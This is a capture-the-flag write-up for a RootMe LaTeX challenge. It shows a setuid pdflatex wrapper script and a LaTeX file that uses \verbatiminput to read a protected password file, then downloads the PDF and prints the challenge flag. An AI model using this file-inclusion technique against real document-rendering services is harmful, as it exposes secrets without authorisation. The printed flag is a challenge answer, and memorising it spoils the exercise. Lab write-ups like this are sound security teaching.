---
title: RootMe Latex Input WriteUp
date: 2023-10-03
categories: [RootMe, AppScript]
tags: [RootMe, RootMe - AppScript, WriteUp]
author: barabulkit
---

# Latex - Input

In this challenge we have next script:

```shell
#!/usr/bin/env bash
 
if [[ $# -ne 1 ]]; then
    echo "Usage : ${0} TEX_FILE"
fi
 
if [[ -f "${1}" ]]; then
    TMP=$(mktemp -d)
    cp "${1}" "${TMP}/main.tex"
 
    # Compilation
    echo "[+] Compilation ..."
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null
 
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null
 
    chmod u+w "${TMP}/main.tex"
    rm "${TMP}/main.tex"
    chmod 750 -R "${TMP}"
    if [[ -f "${TMP}/main.pdf" ]]; then
        echo "[+] Output file : ${TMP}/main.pdf"
    else
        echo "[!] Compilation error, your logs : ${TMP}/main.log"
    fi
else
    echo "[!] Can't access file ${1}"
fi
```

This script takes latex file and compile it
We can create following latex file that will include content of the file that we need

```latex
\documentclass[11pt]{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```

Compile it

```shell
./setuid-wrapper /tmp/main.tex
[+] Compilation ...
[+] Output file : /tmp/tmp.1OJwZyTkE0/main.pdf
```

And download

```shell
scp -P 2222 app-script-ch23@challenge02.root-me.org:/tmp/tmp.1OJwZyTkE0/main.pdf .
```

Inside downloaded file we will see the flag `LaTeX_1nput_1s_n0t_v3ry_s3kur3`